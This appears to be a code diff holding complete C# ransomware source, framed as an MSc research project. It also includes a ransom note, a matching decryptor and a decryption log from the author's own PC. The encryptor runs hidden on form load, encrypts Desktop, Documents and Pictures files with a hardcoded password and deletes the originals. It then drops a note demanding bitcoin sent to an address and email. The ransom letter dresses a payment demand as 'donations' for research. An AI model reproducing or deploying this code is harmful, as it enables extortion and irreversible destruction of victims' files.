@@ -1,0 +1,505 @@
+// Using Microsoft Visual Studio .Net Security Modules, Windows Forms and Libraries //
+
+using System.IO;
+using System;
+using System.Windows.Forms;
+using System.Security.Cryptography;
+
+
+namespace RansomwareExecutor
+{
+    public partial class Form1 : Form
+    {
+        
+
+
+        // Variables //
+
+        private const bool DELETE_ALL_ORIGINALS = true; /* By this command original files will be deleted */
+        private const bool ENCRYPT_DESKTOP = true; /* By this command all files of Desktop folder will be Encrypted */
+        private const bool ENCRYPT_DOCUMENTS = true; /* By this command all files of Documents folder will be Encrypted */
+        private const bool ENCRYPT_PICTURES = true; /* By this command all files of Pictures folder will be Encrypted  */
+        private const string ENCRYPTED_FILE_EXTENSION = ".uhmsclatif";
+        private const string ENCRYPT_PASSWORD = "University";
+        private const string BITCOIN_ADDRESS = "2dhfsdhfNKJKSJKhtrdx4euygx45w3hjdheiuriuru2488";
+        private const string BITCOIN_RANSOM_AMOUNT = "1000";
+        private const string EMAIL_ADDRESS = "mscprojectuhlatif@gmail.com";
+
+        // variables end //
+        
+
+// Serializations of tasks with log and notifications //
+
+        private static string ENCRYPTION_LOG = "";
+        private string RANSOM_LETTER =
+           "All of your files have been encrypted.\n\n" +
+           "To unlock them, please send " + BITCOIN_RANSOM_AMOUNT + " bitcoin(s) to BTC address: " + BITCOIN_ADDRESS + "\n" +
+           "Afterwards, please email your transaction ID to: " + EMAIL_ADDRESS + "\n\n" +
+           "Thank you and have a nice day!\n\n" +
+           "Encryption Log:\n" +
+           "----------------------------------------\n";
+        private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
+        private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+        private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
+        private static int encryptedFileCount = 0;
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            initializeForm();
+
+            if (ENCRYPT_DESKTOP)
+            {
+                encryptFolderContents(DESKTOP_FOLDER);
+            }
+
+            if (ENCRYPT_PICTURES)
+            {
+                encryptFolderContents(PICTURES_FOLDER);
+            }
+
+            if (ENCRYPT_DOCUMENTS)
+            {
+                encryptFolderContents(DOCUMENTS_FOLDER);
+            }
+
+            if (encryptedFileCount > 0)
+            {
+                formatFormPostEncryption();
+                dropRansomLetter();
+            }
+            else
+            {
+                Console.Out.WriteLine("No files to encrypt.");
+                Application.Exit();
+            }
+        }
+
+        private void dropRansomLetter()
+        {
+            StreamWriter ransomWriter = new StreamWriter(DESKTOP_FOLDER + @"\___RECOVER__FILES__" + ENCRYPTED_FILE_EXTENSION + ".txt");
+            ransomWriter.WriteLine(RANSOM_LETTER);
+            ransomWriter.WriteLine(ENCRYPTION_LOG);
+            ransomWriter.Close();
+        }
+
+        private void formatFormPostEncryption()
+        {
+            this.Opacity = 100;
+            this.WindowState = FormWindowState.Maximized;
+            lblCount.Text = "Your files (count: " + encryptedFileCount + ") have been encrypted!";
+        }
+
+        private void initializeForm()
+        {
+            this.Opacity = 0;
+            this.ShowInTaskbar = false;
+            //this.WindowState = FormWindowState.Maximized;
+            lblBitcoinAmount.Text = "Please send " + BITCOIN_RANSOM_AMOUNT + " Bitcoin(s) to the following BTC address:";
+            txtBitcoinAddress.Text = BITCOIN_ADDRESS;
+            txtEmailAddress.Text = EMAIL_ADDRESS;
+            lblBitcoinAmount.Focus();
+        }
+
+        static void encryptFolderContents(string sDir)
+        {
+            try
+            {
+                foreach (string f in Directory.GetFiles(sDir))
+                {
+                    if (!f.Contains(ENCRYPTED_FILE_EXTENSION)) {
+                        Console.Out.WriteLine("Encrypting: " + f);
+                        FileEncrypt(f, ENCRYPT_PASSWORD);
+                    }
+                }
+
+                foreach (string d in Directory.GetDirectories(sDir))
+                {
+                    encryptFolderContents(d);
+                }
+            }
+            catch (System.Exception excpt)
+            {
+                Console.WriteLine(excpt.Message);
+            }
+        }
+
+        private static void FileEncrypt(string inputFile, string password)
+        {
+            //http://stackoverflow.com/questions/27645527/aes-encryption-on-large-files
+            //generate random salt
+            byte[] salt = GenerateRandomSalt();
+
+            //create output file name
+            FileStream fsCrypt = new FileStream(inputFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create);
+
+            //convert password string to byte arrray
+            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
+
+            //Set Rijndael symmetric encryption algorithm
+            RijndaelManaged AES = new RijndaelManaged();
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+            AES.Padding = PaddingMode.PKCS7;
+
+            //http://stackoverflow.com/questions/2659214/why-do-i-need-to-use-the-rfc2898derivebytes-class-in-net-instead-of-directly
+            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
+            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+            //Cipher modes: http://security.stackexchange.com/questions/52665/which-is-the-best-cipher-mode-and-padding-mode-for-aes-encryption
+            AES.Mode = CipherMode.CBC;
+
+            // write salt to the begining of the output file, so in this case can be random every time
+            fsCrypt.Write(salt, 0, salt.Length);
+
+            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
+
+            FileStream fsIn = new FileStream(inputFile, FileMode.Open);
+
+            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
+            byte[] buffer = new byte[1048576];
+            int read;
+
+            try
+            {
+                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    //Application.DoEvents(); // -> for responsive GUI, using Task will be better!
+                    cs.Write(buffer, 0, read);
+                }
+
+                // Close up
+                fsIn.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+            finally
+            {
+                ENCRYPTION_LOG += inputFile + "\n";
+                encryptedFileCount++;
+                cs.Close();
+                fsCrypt.Close();
+                if (DELETE_ALL_ORIGINALS)
+                {
+                    File.Delete(inputFile);
+                }
+            }
+        }
+
+        private static void FileDecrypt(string inputFile, string outputFile, string password)
+        {
+            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
+            byte[] salt = new byte[32];
+
+            FileStream cryptoFileStream = new FileStream(inputFile, FileMode.Open);
+            cryptoFileStream.Read(salt, 0, salt.Length);
+
+            RijndaelManaged AES = new RijndaelManaged();
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+            AES.Padding = PaddingMode.PKCS7;
+            AES.Mode = CipherMode.CBC;
+
+            CryptoStream cryptoStream = new CryptoStream(cryptoFileStream, AES.CreateDecryptor(), CryptoStreamMode.Read);
+
+            FileStream fileStreamOutput = new FileStream(outputFile, FileMode.Create);
+
+            int read;
+            byte[] buffer = new byte[1048576];
+
+            try
+            {
+                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    //Application.DoEvents();
+                    fileStreamOutput.Write(buffer, 0, read);
+                }
+            }
+            catch (CryptographicException ex_CryptographicException)
+            {
+                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+
+            try
+            {
+                cryptoStream.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
+            }
+            finally
+            {
+                fileStreamOutput.Close();
+                cryptoFileStream.Close();
+            }
+        }
+
+        public static byte[] GenerateRandomSalt()
+        {
+            byte[] data = new byte[32];
+
+            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
+            {
+                for (int i = 0; i < 10; i++)
+                {
+                    // Fille the buffer with the generated data
+                    rng.GetBytes(data);
+                }
+            }
+
+            return data;
+        }
+    }
+}
+
+
+
+Hi Users!
+
+!!!You have been Hacked!!!!!!
+All of your files have been encrypted
+Your computer was infected with a ransomware virus. Your files have been encrypted and you won't 
+be able to decrypt them without our help.
+
+Please do not worry! This is not hackers! I am a Computer Scientist and this is my research project to help the cyber users to protect themselves from any kinds of cyber attack, especially from ransomware. 
+
+What can I do to get my files back? You can donate some money to contribute to develop decryptor tools by which billions of users can decrypt their ransomware infected files without paying any ransome money. Decryption software will allow you to recover all of your data and remove the
+ransomware from your computer.You can donate for this from 1-2000 pound through Bitcoin only.
+ 
+Many of our customers have reported these sites to be fast and reliable:
+Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com
+
+Payment informationAmount: 1000 Bitcoins
+Bitcoin Address:  bc1qlnzcep4fuui544sdvnbl4ac0ttdrq7awxev9ehu465f2vpt9x0
+
+Have a good day! Join our cybersecurity team to protect the cyber-world from cybercriminals.
+
+
+# Decrypting Codes
+
+using System;
+using System.IO;
+using System.Security.Cryptography;
+
+namespace DecrypterExecutor
+{
+    class Program
+    {
+
+       
+
+
+        // VARIABLES  //
+
+        private const bool DELETE_ENCRYPTED_FILE = true; /* CAUTION */
+        private const bool DECRYPT_DESKTOP = true;
+        private const bool DECRYPT_DOCUMENTS = true;
+        private const bool DECRYPT_PICTURES = true;
+        private const string ENCRYPTED_FILE_EXTENSION = ".uhmsclatif";
+        private const string ENCRYPT_PASSWORD = "University";
+
+        // ----------------------------- END -------------------------------- //
+
+
+
+
+
+
+        private static string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
+        private static string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+        private static string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
+        private static string DECRYPTION_LOG = "";
+        private static int decryptedFileCount = 0;
+        static void Main(string[] args)
+        {
+            if (DECRYPT_DESKTOP)
+            {
+                decryptFolderContents(DESKTOP_FOLDER);
+            }
+
+            if (DECRYPT_PICTURES)
+            {
+                decryptFolderContents(PICTURES_FOLDER);
+            }
+
+            if (DECRYPT_DOCUMENTS)
+            {
+                decryptFolderContents(DOCUMENTS_FOLDER);
+            }
+
+            if (decryptedFileCount > 0)
+            {
+                dropDecryptionLog();
+            }
+            else
+            {
+                Console.Out.WriteLine("No files to encrypt.");
+            }
+
+        }
+
+        private static void dropDecryptionLog()
+        {
+            StreamWriter ransomWriter = new StreamWriter(DESKTOP_FOLDER + @"\___DECRYPTION_LOG.txt");
+            ransomWriter.WriteLine(decryptedFileCount + " files have been decrypted." +
+                "\n----------------------------------------\n" +
+                DECRYPTION_LOG);
+            ransomWriter.Close();
+        }
+
+        private static bool fileIsEncrypted(string inputFile)
+        {
+            if (inputFile.Contains(ENCRYPTED_FILE_EXTENSION))
+                if (inputFile.Substring(inputFile.Length - ENCRYPTED_FILE_EXTENSION.Length, ENCRYPTED_FILE_EXTENSION.Length) == ENCRYPTED_FILE_EXTENSION)
+                    return true;
+            return false; 
+        }
+
+        static void decryptFolderContents(string sDir)
+        {
+            try
+            {
+                foreach (string file in Directory.GetFiles(sDir))
+                {
+                    if (fileIsEncrypted(file))
+                    {
+                        FileDecrypt(file, file.Substring(0, file.Length - ENCRYPTED_FILE_EXTENSION.Length), ENCRYPT_PASSWORD);
+                    }
+                }
+
+                foreach (string directory in Directory.GetDirectories(sDir))
+                {
+                    decryptFolderContents(directory);
+                }
+            }
+            catch (System.Exception excpt)
+            {
+                Console.WriteLine(excpt.Message);
+            }
+        }
+
+        private static void FileDecrypt(string inputFile, string outputFile, string password)
+        {
+            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
+            byte[] salt = new byte[32];
+
+            FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
+            fsCrypt.Read(salt, 0, salt.Length);
+
+            RijndaelManaged AES = new RijndaelManaged();
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+            AES.Padding = PaddingMode.PKCS7;
+            AES.Mode = CipherMode.CBC;
+
+            CryptoStream cryptoStream = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);
+
+            FileStream fileStreamOutput = new FileStream(outputFile, FileMode.Create);
+
+            int read;
+            byte[] buffer = new byte[1048576];
+
+            try
+            {
+                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    //Application.DoEvents();
+                    fileStreamOutput.Write(buffer, 0, read);
+                }
+            }
+            catch (CryptographicException ex_CryptographicException)
+            {
+                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+
+            try
+            {
+                cryptoStream.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
+            }
+            finally
+            {
+                fileStreamOutput.Close();
+                fsCrypt.Close();
+                if (DELETE_ENCRYPTED_FILE)
+                    File.Delete(inputFile);
+                DECRYPTION_LOG += inputFile + "\n";
+                decryptedFileCount++;
+            }
+        }
+    }
+}
+
+
+#Output
+
+42 files have been decrypted.
+----------------------------------------
+C:\Users\Muhammad Abdul Latif\Desktop\Ade-George-The-Divine-Spark-short-stories.pdf.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\Baldwin-James-Bruce-and-the-Spider-Short-Stories.pdf.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\Balzac-Honore-de-The-Devils-Heir-short-stories.pdf.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\desktop.ini.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\download (1).jpg.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\download (2).jpeg.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\download (3).png.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\download.jfif.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\download.png.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\hack.jpg.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\Latif.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\Note.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\Ransom Note.png.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\readme.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\readme_first.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\read_it.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\security_update2022 (2).exe.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\security_update2022.exe.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\Short-stories-Sherwood-Anderson-The-Dumb-Man.pdf.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\Visual Studio Code.lnk.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\___DECRYPTION_LOG.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\Chaos Ransomware Builder  v4\uhlatifmsc-decrypter\Decrypter.exe.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\Chaos Ransomware Builder  v4\uhlatifmsc-decrypter\Decrypter.exe.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\Chaos Ransomware Builder  v4\uhlatifmsc-decrypter\privateKey.chaos.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\Chaos Ransomware Builder  v4\uhlatifmsc-decrypter\publicKey.chaos.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Desktop\Chaos Ransomware Builder  v4\uhlatifmsc-decrypter\readme_first.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Pictures\download.jfif.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Pictures\readme_first.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Pictures\Camera Roll\desktop.ini.uhlatifmsc.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Pictures\Camera Roll\readme_first.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Pictures\Camera Roll\read_it.txt.uhlatifmsc.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Pictures\Saved Pictures\desktop.ini.uhlatifmsc.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Pictures\Saved Pictures\readme_first.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Pictures\Saved Pictures\read_it.txt.uhlatifmsc.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Documents\desktop.ini.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Documents\download (1).jpg.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Documents\download (2).jpeg.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Documents\download.png.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Documents\Latif.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Documents\readme.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Documents\readme_first.txt.uhmsclatif
+C:\Users\Muhammad Abdul Latif\Documents\read_it.txt.uhmsclatif
